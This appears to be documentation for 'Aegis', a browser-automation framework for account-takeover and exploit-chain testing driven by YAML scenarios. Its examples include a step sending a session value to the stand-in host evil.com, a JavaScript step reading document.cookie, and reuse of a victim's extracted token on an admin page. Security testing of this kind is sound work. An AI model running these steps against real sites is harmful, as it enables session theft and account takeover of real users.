# Aegis ATO & Multi-Instance Exploitation Guide

## Overview
Aegis now supports advanced Account Takeover (ATO) simulations and complex exploit chains involving multiple independent browser instances. This allows you to orchestrate attacks that require interaction between an attacker and a victim, or multiple user roles.

## Core Features
- **Multi-Instance Support**: Run multiple isolated browser sessions (App contexts) simultaneously.
- **Role-Based Orchestration**: Define actions for different roles (e.g., `victim`, `attacker`, `admin`).
- **YAML Configuration**: Define complex attack scenarios in a readable YAML format.
- **Automated Verification**: Built-in assertions to verify the success of an attack.
- **Data Extraction & Logic**: Extract tokens or data from one instance and use them in another (e.g. `{{stolen_token}}`).

## Configuration File Structure

The configuration file is the heart of the new Aegis ATO system. It defines the target, the instances to spawn, and the sequence of tasks to execute.

### Example Config (`ato_scenario.yaml`)

```yaml
target: https://target-app.com

instances:
  - name: victim
    type: browser
    headless: true

  - name: attacker
    type: browser
    headless: true

tasks:
  - name: "Step 1: Victim Logs In & Token Leak"
    actions:
      - instance: victim
        type: navigate
        params:
          url: https://target-app.com/login
      # ... login steps ...
      - instance: victim
        type: extract
        params:
          selector: "#api-token"
          variable: "TARGET_TOKEN"

  - name: "Step 2: Attacker Uses Token"
    actions:
      - instance: attacker
        type: navigate
        params:
          # Use the extracted variable
          url: https://target-app.com/admin?token={{TARGET_TOKEN}}
      - instance: attacker
        type: assert
        params:
          selector: ".admin-dashboard"
          contains: "Access Granted"
```

## Running the Exploit
To run an ATO scenario:
```bash
go run ./cmd/aegis exploit --config ./configs/ato_scenario.yaml
```

## Available Actions

| Action Type | Params | Description |
|---|---|---|
| `navigate` | `url` | Navigates the instance to a URL. Support variables. |
| `click` | `selector` | Clicks an element. |
| `input` | `selector`, `value` | Types text into an input field. |
| `submit` | `selector` (optional) | Press Enter key on element or globally. |
| `wait` | `duration` | Pauses execution (e.g., `2s`). |
| `eval` | `script`, `variable` (opt) | Executes JS. Can capture result to `variable`. |
| `extract` | `selector`, `variable`, `attribute` (opt) | Extracts text or attribute from element into a variable. |
| `assert` | `selector`, `text` (exact), `contains` (partial) | Verifies element content. |
| `screenshot` | `path` | Captures a screenshot. |

## Variables & Data Extraction

You can pass data between instances or steps using **variables**.

1. **Extracting Data**: Use the `extract` action to save the text content (or attribute) of an element to a named variable.
   ```yaml
   type: extract
   params:
     selector: "#session-id"
     variable: "my_session"
     attribute: "value" # Optional: grab attribute instead of inner text
   ```

2. **Using Variables**: Use `{{variable_name}}` in any param of subsequent actions.
   ```yaml
   type: navigate
   params:
     url: "https://evil.com/?data={{my_session}}"
   ```
3. **Capturing from JS**: The `eval` action can also capture the return value of the script to a variable.
   ```yaml
   type: eval
   params:
     script: "() => document.cookie"
     variable: "full_cookies"
   ```

## Vulnerability Scenarios Covered
This framework can be used to test:
- **Session Hijacking**: Verify if a stolen session token grants access.
- **CSRF**: Have a victim visit a malicious page (hosted by attacker) and verify state change.
- **IDOR**: Log in as User A, try to access User B's resource.
- **XSS**: Inject a script and verify execution via `eval`.
- **Race Conditions**: Trigger simultaneous actions from multiple instances (requires parallel execution support in future).

